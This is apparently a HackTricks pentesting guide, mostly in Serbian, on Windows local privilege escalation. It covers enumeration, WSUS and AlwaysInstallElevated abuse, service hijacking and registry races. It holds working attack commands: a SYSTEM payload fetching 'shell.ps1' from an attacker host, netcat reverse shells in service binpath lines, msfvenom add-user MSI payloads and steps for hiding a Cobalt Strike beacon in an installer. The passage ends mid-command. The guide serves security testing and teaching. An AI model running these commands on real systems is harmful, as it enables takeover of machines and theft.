# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Najbolji alat za traženje Windows local privilege escalation vektora:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Početna Windows teorija

### Access Tokens

**Ako ne znate šta su Windows Access Tokens, pročitajte sledeću stranicu pre nego što nastavite:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Pogledajte sledeću stranicu za više informacija o ACLs - DACLs/SACLs/ACEs:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Ako ne znate šta su integrity levels u Windows-u, trebalo bi da pročitate sledeću stranicu pre nego što nastavite:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows Security Controls

Postoje različite stvari u Windows-u koje bi mogle **sprečiti da enumerišete sistem**, pokrećete executables ili čak **otkriju vaše aktivnosti**. Trebalo bi da **pročitate** sledeću **stranicu** i **enumerišete** sve ove **odbrambene** **mehanizme** pre nego što počnete enumeration za privilege escalation:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

### Admin Protection / UIAccess silent elevation

UIAccess procesi pokrenuti kroz `RAiLaunchAdminProcess` mogu se zloupotrebiti da bi se došlo do High IL bez promptova kada se zaobiđu AppInfo secure-path provere. Pogledajte ovde namenski workflow za UIAccess/Admin Protection bypass:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Secure Desktop accessibility registry propagation može se zloupotrebiti za arbitrary SYSTEM registry write (RegPwn):

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

Novije Windows build verzije su takođe uvele **SMB arbitrary-port** LPE putanju gde se privilegovana lokalna NTLM autentikacija reflektuje preko ponovo korišćene SMB TCP konekcije:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## System Info

### Version info enumeration

Proverite da li Windows verzija ima neku poznatu ranjivost (proverite i primenjene patch-eve).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Exploits verzija

Ovaj [site](https://msrc.microsoft.com/update-guide/vulnerability) je koristan za traženje detaljnih informacija o Microsoft sigurnosnim ranjivostima. Ova baza podataka ima više od 4,700 sigurnosnih ranjivosti, što pokazuje **ogromnu attack surface** koju Windows okruženje predstavlja.

**Na sistemu**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas ima watson ugrađen)_

**Lokalno sa sistemskim informacijama**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github repos za exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Okruženje

Da li je neka credential/Juicy info sačuvana u env promenljivama?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell History
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell Transcript fajlovi

Možete naučiti kako da ovo uključite na [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

Detalji izvršavanja PowerShell pipeline-a se beleže, uključujući izvršene komande, pozive komandi i delove skripti. Međutim, potpuni detalji izvršavanja i rezultati izlaza možda neće biti zabeleženi.

Da biste ovo omogućili, pratite uputstva u odeljku "Transcript files" dokumentacije, i izaberite **"Module Logging"** umesto **"Powershell Transcription"**.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Za prikaz poslednjih 15 događaja iz PowersShell logova možete izvršiti:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

Kompletan zapis aktivnosti i pun sadržaj izvršavanja skripte se beleži, obezbeđujući da je svaki blok koda dokumentovan dok se izvršava. Ovaj proces čuva sveobuhvatan audit trag svake aktivnosti, što je korisno za forenziku i analizu zlonamernog ponašanja. Dokumentovanjem sve aktivnosti u trenutku izvršavanja, pružaju se detaljni uvidi u proces.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Logovi događaja za Script Block mogu se naći u Windows Event Viewer-u na putanji: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Da biste videli poslednjih 20 događaja možete koristiti:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Internet Settings
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Diskovi
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Možete kompromitovati sistem ako se ažuriranja ne traže preko http**S** već preko http.

Počinjete tako što proverite da li mreža koristi WSUS ažuriranje bez SSL-a, pokretanjem sledećeg u cmd:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Ili sledeće u PowerShell:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
Ako dobijete odgovor poput jednog od ovih:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
And if `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` or `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` is equals to `1`.

Then, **it is exploitable.** If the last registry is equals to 0, then, the WSUS entry will be ignored.

In orther to exploit this vulnerabilities you can use tools like: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus)- These are MiTM weaponized exploits scripts to inject 'fake' updates into non-SSL WSUS traffic.

Read the research here:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Read the complete report here**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Basically, this is the flaw that this bug exploits:

> If we have the power to modify our local user proxy, and Windows Updates uses the proxy configured in Internet Explorer’s settings, we therefore have the power to run [PyWSUS](https://github.com/GoSecure/pywsus) locally to intercept our own traffic and run code as an elevated user on our asset.
>
> Furthermore, since the WSUS service uses the current user’s settings, it will also use its certificate store. If we generate a self-signed certificate for the WSUS hostname and add this certificate into the current user’s certificate store, we will be able to intercept both HTTP and HTTPS WSUS traffic. WSUS uses no HSTS-like mechanisms to implement a trust-on-first-use type validation on the certificate. If the certificate presented is trusted by the user and has the correct hostname, it will be accepted by the service.

You can exploit this vulnerability using the tool [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (once it's liberated).

## Third-Party Auto-Updaters and Agent IPC (local privesc)

Many enterprise agents expose a localhost IPC surface and a privileged update channel. If enrollment can be coerced to an attacker server and the updater trusts a rogue root CA or weak signer checks, a local user can deliver a malicious MSI that the SYSTEM service installs. See a generalized technique (based on the Netskope stAgentSvc chain – CVE-2025-0309) here:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM via TCP 9401)

Veeam B&R < `11.0.1.1261` exposes a localhost service on **TCP/9401** that processes attacker-controlled messages, allowing arbitrary commands as **NT AUTHORITY\SYSTEM**.

- **Recon**: confirm the listener and version, e.g., `netstat -ano | findstr 9401` and `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.
- **Exploit**: place a PoC such as `VeeamHax.exe` with the required Veeam DLLs in the same directory, then trigger a SYSTEM payload over the local socket:
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
Servis izvršava komandu kao SYSTEM.
## KrbRelayUp

Postoji **local privilege escalation** ranjivost u Windows **domain** okruženjima pod određenim uslovima. Ti uslovi uključuju okruženja gde **LDAP signing is not enforced,** korisnici imaju self-rights koji im omogućavaju da konfigurišu **Resource-Based Constrained Delegation (RBCD),** i mogućnost da korisnici kreiraju računare unutar domena. Važno je napomenuti da su ovi **requirements** ispunjeni pomoću **default settings**.

Pronađi **exploit in** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Za više informacija o toku napada pogledaj [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**Ako** su ova 2 registra **enabled** (vrednost je **0x1**), onda korisnici bilo kog privilegija mogu da **install** (izvrše) `*.msi` fajlove kao NT AUTHORITY\\**SYSTEM**.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
Ako imate meterpreter session, možete automatizovati ovu tehniku koristeći modul **`exploit/windows/local/always_install_elevated`**

### PowerUP

Koristite komandu `Write-UserAddMSI` iz power-up da kreirate unutar trenutnog direktorijuma Windows MSI binary za eskalaciju privilegija. Ovaj script upisuje unapred kompajlirani MSI installer koji traži dodavanje korisnika/grupe (pa će vam trebati GIU pristup):
```
Write-UserAddMSI
```
Samo izvrši kreirani binary da bi eskalirao privilegije.

### MSI Wrapper

Pročitaj ovaj tutorial da naučiš kako da napraviš MSI wrapper koristeći ovaj tools. Napomena: možeš da wrap-uješ "**.bat**" file ako samo želiš da **izvršiš** **command lines**


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- **Generate** sa Cobalt Strike ili Metasploit novi Windows EXE TCP payload u `C:\privesc\beacon.exe`
- Otvori **Visual Studio**, izaberi **Create a new project** i upiši "installer" u search box. Izaberi **Setup Wizard** project i klikni **Next**.
- Daj projektu ime, kao **AlwaysPrivesc**, koristi **`C:\privesc`** za location, izaberi **place solution and project in the same directory**, i klikni **Create**.
- Nastavi da klikćeš **Next** dok ne stigneš do koraka 3 od 4 (choose files to include). Klikni **Add** i izaberi Beacon payload koji si upravo generisao. Zatim klikni **Finish**.
- Označi **AlwaysPrivesc** project u **Solution Explorer** i u **Properties**, promeni **TargetPlatform** sa **x86** na **x64**.
- Postoje i druga svojstva koja možeš da promeniš, kao što su **Author** i **Manufacturer**, što može da učini da instalirana app izgleda legitimnije.
- Desni klik na project i izaberi **View > Custom Actions**.
- Desni klik na **Install** i izaberi **Add Custom Action**.
- Dupli klik na **Application Folder**, izaberi svoj **beacon.exe** file i klikni **OK**. Ovo će obezbediti da se beacon payload izvrši čim se installer pokrene.
- U okviru **Custom Action Properties**, promeni **Run64Bit** na **True**.
- Na kraju, **build it**.
- Ako se pojavi warning `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`, proveri da li si postavio platformu na x64.

### MSI Installation

Da bi izvršio **installation** zlonamernog `.msi` file u **background:**
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Za iskorišćavanje ove ranjivosti možete koristiti: _exploit/windows/local/always_install_elevated_

## Antivirus i detektori

### Audit Settings

Ove postavke određuju šta se **loguje**, pa treba da obratite pažnju
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding, je korisno znati gde se logovi šalju
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** je dizajniran za **upravljanje lozinkama lokalnog Administratora**, obezbeđujući da je svaka lozinka **jedinstvena, nasumična i redovno ažurirana** na računarima pridruženim domenu. Ove lozinke se bezbedno čuvaju unutar Active Directory i mogu im pristupiti samo korisnici kojima su dodeljene dovoljne dozvole putem ACLs, što omogućava da vide lozinke lokalnog admina ako su autorizovani.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Ako je aktivan, **lozinke u plain-text formatu se čuvaju u LSASS** (Local Security Authority Subsystem Service).\
[**Više informacija o WDigest-u na ovoj stranici**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

Počevši od **Windows 8.1**, Microsoft je uveo poboljšanu zaštitu za Local Security Authority (LSA) kako bi **blokirao** pokušaje nepouzdanih procesa da **čitaju njegovu memoriju** ili ubacuju kod, dodatno obezbeđujući sistem.\
[**Više informacija o LSA Protection ovde**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** je uveden u **Windows 10**. Njegova svrha je da zaštiti kredencijale sačuvane na uređaju od pretnji kao što su pass-the-hash napadi.| [**Više informacija o Credentials Guard ovde.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Keširani kredencijali

**Domen kredencijali** se autentifikuju putem **Local Security Authority** (LSA) i koriste ih komponente operativnog sistema. Kada se podaci za prijavu korisnika autentifikuju od strane registrovanog bezbednosnog paketa, obično se uspostavljaju domen kredencijali za tog korisnika.\
[**Više informacija o Cached Credentials ovde**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Korisnici i grupe

### Enumeriši korisnike i grupe

Treba da proveriš da li neke od grupa čiji si član imaju zanimljive dozvole
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Privilegovane grupe

Ako **pripadaš nekoj privilegovanoj grupi, možda možeš da eskaliraš privilegije**. Saznaj više o privilegovanim grupama i kako da ih zloupotrebiš za eskalaciju privilegija ovde:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Manipulacija tokenima

**Saznaj više** o tome šta je **token** na ovoj stranici: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Proveri sledeću stranicu da bi **saznao više o zanimljivim tokenima** i kako da ih zloupotrebiš:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Prijavljeni korisnici / Sesije
```bash
qwinsta
klist sessions
```
### Početni folderi
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### Politika lozinki
```bash
net accounts
```
### Uzmi sadržaj clipboarda
```bash
powershell -command "Get-Clipboard"
```
## Pokrenuti procesi

### Dozvole za fajlove i foldere

Pre svega, pri listanju procesa **proveri da li postoje lozinke unutar komandne linije procesa**.\
Proveri da li možeš da **prepišeš neki pokrenuti binary** ili da li imaš write permissions nad folderom binarnog fajla da bi iskoristio moguće [**DLL Hijacking attacks**](dll-hijacking/index.html):
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Uvek proveri da li su [**electron/cef/chromium debuggers**] pokrenuti, možeš to zloupotrebiti za eskalaciju privilegija](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**Provera dozvola binarnih fajlova procesa**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Provera dozvola za foldere binarnih fajlova procesa (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Mining lozinki iz memorije

Možete napraviti memory dump pokrenutog procesa koristeći **procdump** iz sysinternals. Servisi kao što je FTP imaju **credentials u clear text u memoriji**, pokušajte da dumpujete memoriju i pročitate credentials.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Insecure GUI apps

**Aplikacije koje rade kao SYSTEM mogu omogućiti korisniku da pokrene CMD, ili da pregleda direktorijume.**

Primer: "Windows Help and Support" (Windows + F1), pretraži "command prompt", klikni na "Click to open Command Prompt"

## Services

Service Triggers omogućavaju Windows-u da pokrene servis kada se dogode određeni uslovi (aktivnost named pipe/RPC endpoint, ETW događaji, dostupnost IP-a, dolazak uređaja, GPO osvežavanje, itd.). Čak i bez SERVICE_START prava često možeš pokrenuti privilegovane servise tako što aktiviraš njihove triggere. Pogledaj tehnike za enumeraciju i aktivaciju ovde:

-
{{#ref}}
service-triggers.md
{{#endref}}

Dobi listu servisa:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### Dozvole

Možete koristiti **sc** da biste dobili informacije o servisu
```bash
sc qc <service_name>
```
Preporučuje se da imate binary **accesschk** iz _Sysinternals_ da biste proverili potreban nivo privilegija za svaki servis.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
Preporučuje se da proverite da li "Authenticated Users" mogu da menjaju bilo koju uslugu:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[Možete preuzeti accesschk.exe za XP ovde](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Enable service

Ako imate ovu grešku (na primer sa SSDPSRV):

_System error 1058 has occurred._\
_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

Možete je omogućiti koristeći
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**Imajte u vidu da servis upnphost zavisi od SSDPSRV da bi radio (za XP SP1)**

**Još jedno zaobilaženje** ovog problema je pokretanje:
```
sc.exe config usosvc start= auto
```
### **Izmeni putanju binarnog fajla servisa**

U scenariju gde grupa "Authenticated users" poseduje **SERVICE_ALL_ACCESS** nad servisom, moguće je izmeniti izvršni binarni fajl servisa. Da bi se izmenio i izvršio **sc**:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Restart service
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Privilegije mogu biti eskalirane kroz različite dozvole:

- **SERVICE_CHANGE_CONFIG**: Omogućava reconfiguraciju servisa binarne datoteke.
- **WRITE_DAC**: Omogućava reconfiguraciju dozvola, što vodi do mogućnosti promene konfiguracija servisa.
- **WRITE_OWNER**: Dozvoljava preuzimanje vlasništva i reconfiguraciju dozvola.
- **GENERIC_WRITE**: Nasleđuje mogućnost promene konfiguracija servisa.
- **GENERIC_ALL**: Takođe nasleđuje mogućnost promene konfiguracija servisa.

Za detekciju i eksploataciju ove ranjivosti, može se koristiti _exploit/windows/local/service_permissions_.

### Slabe dozvole za service binaries

Ako servis radi kao **`LocalSystem`**, **`LocalService`**, **`NetworkService`**, ili privilegovani domen nalog, ali **low-privileged korisnici mogu da izmene servisni EXE ili njegov parent folder**, servis često može biti hijackovan tako što se **zameni binary i restartuje servis**.

**Proverite da li možete da menjate binary koji izvršava servis** ili da li imate **write dozvole na folderu** gde se binary nalazi ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Možete dobiti svaki binary koji izvršava servis pomoću **wmic** (ne u system32) i proveriti svoje dozvole pomoću **icacls**:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Možete takođe da koristite **sc** i **icacls**:
```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
Potražite opasne ACL-ove dodeljene **`Everyone`**, **`BUILTIN\Users`** ili **`Authenticated Users`**, posebno **`(F)`**, **`(M)`** ili **`(W)`** na izvršnoj datoteci servisa ili na direktorijumu koji je sadrži. Praktičan tok zloupotrebe je:

1. Potvrdite account servisa i putanju do izvršne datoteke pomoću `sc qc <service_name>`.
2. Potvrdite da je binary upisiv sa `icacls <path>`.
3. Zamenite service binary payload-om ili validnim malicious service binary.
4. Restartujte servis sa `sc stop <service_name> && sc start <service_name>` (ili sačekajte reboot / service trigger).

Korisne automatizovane provere:
```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```
> Ako servis ne dozvoljava običnom korisniku da ga restartuje, proveri da li se automatski pokreće pri boot-u, ima akciju pri neuspehu koja ga ponovo pokreće, ili može biti indirektno pokrenut od strane aplikacije koja ga koristi.

### Dozvole za izmenu registra servisa

Treba da proveriš da li možeš da menjaš bilo koji registar servisa.\
Možeš da **proveriš** svoja **ovlašćenja** nad registrom **servisa** na sledeći način:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
Treba proveriti da li **Authenticated Users** ili **NT AUTHORITY\INTERACTIVE** imaju `FullControl` dozvole. Ako imaju, binarni fajl koji servis izvršava može biti izmenjen.

Da biste promenili Path binarnog fajla koji se izvršava:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Registry symlink race to arbitrary HKLM value write (ATConfig)

Neke Windows Accessibility funkcije kreiraju per-user **ATConfig** ključeve koji se kasnije kopiraju od strane **SYSTEM** procesa u HKLM session ključ. Registry **symbolic link race** može da preusmeri taj privilegovani upis u **bilo koju HKLM putanju**, dajući arbitrary HKLM **value write** primitive.

Ključne lokacije (primer: On-Screen Keyboard `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` izlistava instalirane accessibility funkcije.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` čuva user-controlled konfiguraciju.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` se kreira tokom logon/secure-desktop tranzicija i korisnik može da ga upisuje.

Tok zloupotrebe (CVE-2026-24291 / ATConfig):

1. Popuni **HKCU ATConfig** vrednost koju želiš da SYSTEM upiše.
2. Triggeruj secure-desktop copy (npr. **LockWorkstation**), što pokreće AT broker flow.
3. **Pobedi race** tako što postaviš **oplock** na `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`; kada oplock okine, zameni **HKLM Session ATConfig** ključ sa **registry link** ka zaštićenom HKLM targetu.
4. SYSTEM upisuje napadačevu vrednost u preusmerenu HKLM putanju.

Kada dobiješ arbitrary HKLM value write, pivotuj ka LPE preko prepisivanja service konfiguracionih vrednosti:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/command line)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Izaberi service koji običan user može da startuje (npr. **`msiserver`**) i pokreni ga nakon upisa. **Napomena:** javna exploit implementacija **zaključava workstation** kao deo race-a.

Primer alata (RegPwn BOF / standalone):
```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```
### Services registry AppendData/AddSubdirectory permissions

Ako imate ovu dozvolu nad registry-em, to znači da **možete da kreirate pod-registre iz ovog**. U slučaju Windows servisa, ovo je **dovoljno za izvršavanje proizvoljnog koda:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Ako putanja do izvršnog fajla nije unutar navodnika, Windows će pokušati da izvrši svaku završnicu pre razmaka.

Na primer, za putanju _C:\Program Files\Some Folder\Service.exe_ Windows će pokušati da izvrši:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Listaj sve unquoted service paths, izuzev onih koji pripadaju ugrađenim Windows servisima:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
